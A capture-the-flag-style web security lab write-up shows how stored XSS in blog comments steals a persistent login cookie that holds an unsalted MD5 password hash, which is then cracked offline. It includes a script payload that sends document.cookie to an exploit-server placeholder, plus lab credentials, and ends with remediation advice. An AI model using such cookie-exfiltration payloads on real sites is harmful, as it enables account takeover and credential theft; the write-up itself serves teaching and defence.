# Offline Password Cracking

## Overview

This lab demonstrates an account takeover chain that combines **stored XSS**, **persistent-cookie theft**, and **offline password cracking**.

The application used a `stay-logged-in` cookie whose value contained the username and an MD5 hash of the user's password. Because the cookie was accessible to JavaScript, a stored XSS vulnerability in the blog comment functionality could be used to exfiltrate the victim's persistent authentication cookie.

After Base64-decoding the stolen cookie, the victim's password hash was recovered and cracked offline, revealing the plaintext password and enabling account takeover.

---

## Persistent Login Cookie Format

Logging in with the **Stay logged in** option produced a cookie with the same construction observed in the previous persistent-login lab:

```text
Base64(username:MD5(password))
```

Using the known account `wiener:peter`, the generated cookie could be reproduced locally, confirming the format.

This meant the persistent authentication token directly exposed a reusable password hash after decoding.

---

## Identifying Stored XSS

The blog comment functionality was tested for HTML injection.

A harmless HTML payload rendered successfully, after which JavaScript execution was confirmed using a stored XSS payload.

For example:

```html
<img src=x onerror=alert(1)>
```

The payload executed when the comment was viewed, confirming that attacker-controlled JavaScript could run in another user's browser.

---

## Cookie Exfiltration

The PortSwigger exploit server was used as a collection endpoint.

A stored XSS payload was submitted that redirected the victim's browser to the exploit server while appending `document.cookie` to the request:

```html
<script>
document.location='https://<exploit-server>/?cookie='+document.cookie
</script>
```

When the victim viewed the comment, the exploit-server access log received a request containing the victim's cookies.

The relevant value was:

```text
stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

The normal session cookie was protected separately, but the persistent login cookie was readable through `document.cookie` and could therefore be stolen through XSS.

---

## Decoding the Victim Cookie

Base64-decoding the stolen value produced:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

Therefore, Carlos's password hash was:

```text
26323c16d5f4dabff3bb136f2460a943
```

Because the application used unsalted MD5, the hash could be attacked entirely offline without generating further login attempts against the application.

---

## Offline Password Cracking

The recovered MD5 hash was cracked using a known-password/hash lookup approach.

The plaintext password was:

```text
onceuponatime
```

The recovered credentials were therefore:

```text
carlos:onceuponatime
```

These credentials allowed direct authentication as Carlos and completion of the lab objective.

---

## Attack Chain

```text
Stored XSS in blog comments
        |
        v
Victim views malicious comment
        |
        v
JavaScript executes in victim browser
        |
        v
document.cookie is exfiltrated
        |
        v
Victim stay-logged-in cookie recovered
        |
        v
Base64 decode
        |
        v
carlos:MD5(password)
        |
        v
Offline MD5 cracking
        |
        v
Plaintext password recovered
        |
        v
Account takeover
```

---

## Root Cause

Several weaknesses combined to produce the compromise:

1. **Stored XSS** allowed attacker-controlled JavaScript to execute in another user's browser.
2. The persistent login cookie was **accessible to JavaScript** rather than being protected with `HttpOnly`.
3. The cookie contained a **password-derived value** instead of a random server-side token.
4. The password hash used **unsalted MD5**, which is fast and practical to crack offline.
5. Recovering the hash exposed information directly tied to the user's actual password.

The vulnerability therefore illustrates how multiple individually weak design choices can combine into a complete account-takeover chain.

---

## Impact

An attacker capable of injecting stored JavaScript could steal persistent-login tokens from users who viewed the malicious content.

Because the token exposed the user's password hash, compromise was not limited to the current application session. Successful offline cracking revealed the underlying password itself.

Potential impact includes:

- persistent account takeover;
- disclosure of user passwords;
- compromise of accounts on other services if passwords are reused;
- bypass of normal online brute-force controls;
- large-scale credential theft if many users view the stored payload.

---

## Remediation

### Prevent stored XSS

- Apply context-appropriate output encoding to all user-controlled content.
- Use robust HTML sanitization where rich-text input is required.
- Deploy a restrictive Content Security Policy as defense in depth.

### Protect authentication cookies

Persistent-login cookies should use appropriate security attributes, including:

```text
HttpOnly
Secure
SameSite
```

`HttpOnly` prevents normal client-side JavaScript from reading the cookie and substantially reduces the value of many cookie-stealing XSS payloads.

### Do not store password-derived material in persistent cookies

Persistent authentication should use a high-entropy random token that is:

- unrelated to the user's password;
- stored and validated server-side;
- revocable;
- rotated after use or according to an appropriate lifecycle policy.

### Store passwords using a password-hashing function

Passwords should be stored using a modern password-hashing algorithm such as:

- Argon2id;
- bcrypt;
- scrypt;
- PBKDF2 with appropriate parameters.

Each password must also use a unique salt.

---

## Key Takeaway

Persistent login mechanisms should never expose reusable password-derived material to the client.

When testing authentication systems, a useful chain to consider is:

```text
Can I obtain a persistent token?
        ↓
Can I decode or reverse its structure?
        ↓
Does it contain a password hash or other credential-derived value?
        ↓
Can that value be attacked offline?
```

This lab also demonstrates an important general lesson: an XSS vulnerability can become significantly more severe when authentication tokens are readable by JavaScript and contain weak cryptographic material.
